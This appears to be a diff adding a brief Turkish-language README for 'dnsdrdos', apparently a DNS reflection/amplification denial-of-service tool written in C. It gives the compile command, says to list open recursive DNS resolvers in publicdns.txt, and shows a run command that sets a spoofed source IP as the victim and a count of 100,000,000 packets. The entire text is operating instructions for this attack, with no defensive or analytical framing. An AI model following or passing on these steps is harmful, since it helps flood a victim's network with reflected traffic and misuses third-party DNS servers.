@@ -1,0 +1,10 @@
+gcc dnsdrdos.c -o dnsdrdos -Wall -ansi : Uygulamayı compile et
+- Sonrasında publicdns.txt dosyasını oluştur ve tespit ettiğin recursive public dns ip adreslerini alt alta buraya yaz.
+- ./dnsdrdos -f publicdns.txt -s <çakmakaynakipadresi> -l <kaçtanepaketgonderilecek>
+örneğin: 
+   ./dnsdrdos -f publicdns.txt -s 192.168.1.31 -l 100000000
+   
+   
+   publicdns.txt:
+       192.168.1.30
+       192.140.0.65
